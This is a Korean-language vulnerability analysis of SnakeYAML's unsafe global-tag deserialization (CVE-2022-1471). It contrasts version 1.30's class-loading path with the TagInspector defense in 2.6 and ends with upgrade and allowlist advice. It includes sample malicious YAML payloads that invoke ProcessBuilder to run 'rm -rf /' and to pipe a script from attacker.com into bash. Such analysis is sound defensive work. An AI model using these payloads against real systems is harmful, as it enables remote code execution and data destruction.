# SnakeYAML RCE 보안 취약점 분석: v1.30 vs v2.6

## 개요

Jazzer 그레이박스 퍼징으로 발견된 SnakeYAML 1.30의 RCE 취약점을 분석합니다. 본 문서는 1.30 버전의 문제점과 최신 2.6 버전에서 어떻게 개선되었는지를 구체적으로 보여줍니다.

---

## 1. 문제 요약

### 퍼징 결과 지목 라인
- **라인 332**: ConstructYamlObject.construct() - 클래스 로딩 진입점
- **라인 417**: ConstructScalar 내부 반사 생성자 호출 - RCE 실행 지점

### 근본 원인
1. **제한 없는 클래스 로딩**: YAML 글로벌 태그의 클래스명을 검증 없이 로드

---

## 2. 상세 보안 취약점 분석

### 취약점: 글로벌 태그 기반 임의 클래스 로딩

#### 1.30 버전 (취약)

```java
// Constructor.java, 라인 322
private Construct getConstructor(Node node) {
            Class<?> cl = getClassForNode(node);
            node.setType(cl);
            // call the constructor as if the runtime class is defined
            Construct constructor = yamlClassConstructors.get(node.getNodeId());
            return constructor;
        }
```

```java
// Constructor.java, 라인 661
protected Class<?> getClassForNode(Node node) {
    Class<? extends Object> classForTag = typeTags.get(node.getTag());
    if (classForTag == null) {
        String name = node.getTag().getClassName();  // ← YAML 입력으로부터 직접 읽음
        Class<?> cl;
        try {
            cl = getClassForName(name);  // ← 검증 없이 클래스 로드
        } catch (ClassNotFoundException e) {
            throw new YAMLException("Class not found: " + name);
        }
        typeTags.put(node.getTag(), cl);
        return cl;
    } else {
        return classForTag;
    }
}

protected Class<?> getClassForName(String name) throws ClassNotFoundException {
    try {
        return Class.forName(name, true, Thread.currentThread().getContextClassLoader());
    } catch (ClassNotFoundException e) {
        return Class.forName(name);  // ← 공격자 지정 클래스 로드 가능
    }
}
```

**공격 시나리오**:
```yaml
# RCE 가젯 체인을 포함한 악성 YAML
java.lang.ProcessBuilder:
  - /bin/sh
  - -c
  - "rm -rf /"
```

생성자가 악의적인 코드를 포함한 가젯 클래스라면 단순 로딩만으로 RCE 발생.

#### 개선된 2.6 버전: TagInspector 도입 (글로벌 태그 원천 차단)

`Constructor` 단계가 아니라 그보다 앞선 **Composer 단계에서 검사가 수행**되어, `Constructor#getClassForName()`(클래스 로딩) 및 `setAccessible(true)`(리플렉션 실행) 경로로 **도달하기 전에** 공격을 차단

최신 2.x 버전에서는 개발자가 의도적으로 허용하지 않는 한 **모든 임의 클래스(글로벌 태그) 로딩을 기본적으로 거부**합니다. 

```java
// 메서드 자체는 존재하지만, 2.x에서는 글로벌 태그가 Composer 단계에서 먼저 검사됨
protected Class<?> getClassForNode(Node node) {
    // ... 동일 로직
}
```

```java
// LoaderOptions.java, 라인 255
// Secure by default - no custom classes are allowed
private TagInspector tagInspector = new UnTrustedTagInspector();
```

`UnTrustedTagInspector`의 동작은 “글로벌 태그를 무조건 거부(false)”입니다.

```java
// UnTrustedTagInspector.java, 라인 22
@Override
public boolean isGlobalTagAllowed(Tag tag) {
  return false;
}
```

이 기본 설정은 Composer 단계에서 실제로 적용됩니다. 즉, YAML 이벤트를 Node로 구성하는 과정에서 “커스텀 글로벌 태그”가 감지되면 `Constructor`가 호출되기 전에 예외로 중단됩니다.

```java
// Composer.java, 모든 메서드에 아래 Exception이 추가되었음
nodeTag = new Tag(tag);
if (nodeTag.isCustomGlobal()
    && !loadingConfig.getTagInspector().isGlobalTagAllowed(nodeTag)) {
  throw new ComposerException("Global tag is not allowed: " + tag, startMark);
}
```

**개선 효과**: `!!java.lang.ProcessBuilder` 같은 글로벌 태그가 들어오면 Node를 만들 때부터 막히므로, 이후 단계의 `Constructor#getClassForName()`(클래스 로딩) 및 `ConstructScalar`의 `setAccessible(true)`/`newInstance()`에 도달하지 못해 RCE가 성립하지 않습니다.
**개선 효과**: 이로 인해 `!!java.lang.ProcessBuilder` 등 악성 글로벌 태그가 주입되어도 안전하게 파싱이 중단되어 RCE 공격이 성립하지 않습니다.

**개선 방식(2.x 핵심)**: `LoaderOptions`의 기본 `TagInspector`가 커스텀 글로벌 태그를 거부하므로,
기본 설정에서는 `!!com.acme.Foo` 같은 입력이 `Constructor#getClassForNode()`까지 도달하기 전에
Composer 단계에서 예외로 차단됩니다

---

## 3. 공격 방법론

### 3.1 기본 공격 경로 (1.30)

```
신뢰 불가 YAML 입력
       ↓
Yaml yaml = new Yaml(new Constructor());  ← 기본 Constructor 사용
yaml.load(userInput)
       ↓
Parser → Composer → Constructor
       ↓
ConstructYamlObject.getConstructor()  [라인 332]
       ↓
getClassForNode(node)  [라인 323]
       ↓
getClassForName("java.lang.ProcessBuilder")  [라인 667]
       ↓
Class.forName("java.lang.ProcessBuilder")  [검증 없음]
       ↓
ConstructScalar.construct()
       ↓
javaConstructor.setAccessible(true)  [라인 416]
javaConstructor.newInstance(argument)  [라인 417 - RCE 지점]
       ↓
RCE 발생!
```

### 3.2 악성 YAML 예시

```yaml
!java.lang.ProcessBuilder
- bash
- -c
- 'curl http://attacker.com/shell.sh | bash'
```

---

## 4. 기타 권고 사항

#### SafeConstructor 사용

SnakeYAML 공식문서에서 자바의 기본 타입으로만 객체 생성을 할 수 있게하는 SafeConstructor를 사용하여 YAML 객체를 만들도록 권장되고 있음

```java
// 위험한 코드
Yaml yaml = new Yaml();  // Constructor 기본 사용
Object obj = yaml.load(untrustedInput);

// 안전한 코드
Yaml yaml = new Yaml(new SafeConstructor());  // SafeConstructor 사용
Object obj = yaml.load(untrustedInput);
```

#### (추가) 2.x에서 “글로벌 태그로 커스텀 클래스 생성”이 꼭 필요하다면

2.x의 기본값(`UnTrustedTagInspector`)은 **커스텀 글로벌 태그를 전부 거부**합니다. 즉,
"기본이 false"라는 것은 “개발자가 명시적으로 허용 정책(화이트리스트)을 제공하지 않으면
`!!com.acme.Foo` 같은 태그로 임의 클래스를 만들 수 없다”는 뜻에 가깝습니다.

SnakeYAML 2.6의 공식 확장 지점은 `LoaderOptions#setTagInspector(TagInspector)`이며,
여기에 **허용할 태그만 true를 반환**하는 정책을 넣는 방식으로 allowlist를 구성합니다.

```java
LoaderOptions options = new LoaderOptions();

// 예시: 허용할 패키지/클래스만 true로 (allowlist)
options.setTagInspector(tag -> {
    String className = tag.getClassName();
    return className != null
            && (className.startsWith("com.mycompany.model.")
                    || className.equals("java.time.Instant"));
});

Yaml yaml = new Yaml(new Constructor(options));
Object obj = yaml.load(untrustedInput);
```

주의: allowlist를 풀어주면 다시 “역직렬화(가젯) 위험”이 커질 수 있으므로,
가능하면 글로벌 태그 의존 자체를 제거(=명시적 타입만 처리)하는 편이 안전합니다.

---

## 5. 결론

**최종 요약**:
SnakeYAML 1.30을 공격했던 퍼징 페이로드는 `Constructor`의 리플렉션 로직(332, 417라인 등)을 타겟으로 삼았습니다. 2.6 버전 등 최신 버전에서는 해당 로직 자체를 삭제하지는 않았으나, 상위 수준에서 **`TagInspector`를 도입하여 모든 글로벌 태그(신뢰 불가능한 클래스 명시) 요청을 기본적으로 평가 전 차단**하도록 아키텍처를 개선했습니다. 이로써 알려진 대부분의 Deserialization RCE 공격 벡터가 원천 무효화되었습니다.

**권장 사항**:
- ✅ 모든 프로젝트는 SnakeYAML을 2.x 이상으로 즉시 업그레이드할 것.
- ✅ 불가피하게 특정 클래스 객체를 YAML에서 생성해야 할 경우, `LoaderOptions.setTagInspector()`를 활용해 **허용할 태그만 명시한 화이트리스트**를 구현하여 적용할 것.
- ✅ Yaml 객체를 생성할 때는 가급적 SafeConstructor()를 사용할 것

---

## 6. 참고문헌

- `TagInspector`의 역할은 “글로벌 태그 허용 여부”를 판단하는 정책이며, 문서에 **로컬 태그는 항상 허용**되고, **표준 태그는 항상 허용**된다고 명시되어 있습니다.
    - Javadoc: https://javadoc.io/static/org.yaml/snakeyaml/2.6/org/yaml/snakeyaml/inspector/TagInspector.html
- 기본 구현체인 `UnTrustedTagInspector`는 “untrusted source에서 RCE 방지를 위해 커스텀 인스턴스 생성을 허용하지 않는다(=항상 false)”라고 명시합니다.
    - Javadoc: https://javadoc.io/static/org.yaml/snakeyaml/2.6/org/yaml/snakeyaml/inspector/UnTrustedTagInspector.html
- 유지보수 측 공식 위키(보안/취약점 안내)는 “untrusted source라면 SafeConstructor 사용 + (Spring 예시처럼) 화이트리스트로 기대 타입만 허용”을 권고합니다.
    - Wiki: https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE-2022-1471
    - Wiki: https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE%20%26%20NIST

- TagInspector (Javadoc): https://javadoc.io/static/org.yaml/snakeyaml/2.6/org/yaml/snakeyaml/inspector/TagInspector.html
- UnTrustedTagInspector (Javadoc): https://javadoc.io/static/org.yaml/snakeyaml/2.6/org/yaml/snakeyaml/inspector/UnTrustedTagInspector.html
- LoaderOptions (Javadoc): https://javadoc.io/static/org.yaml/snakeyaml/2.6/org/yaml/snakeyaml/LoaderOptions.html
- CVE-2022-1471 (Wiki): https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE-2022-1471
- CVE & NIST (Wiki): https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE%20%26%20NIST
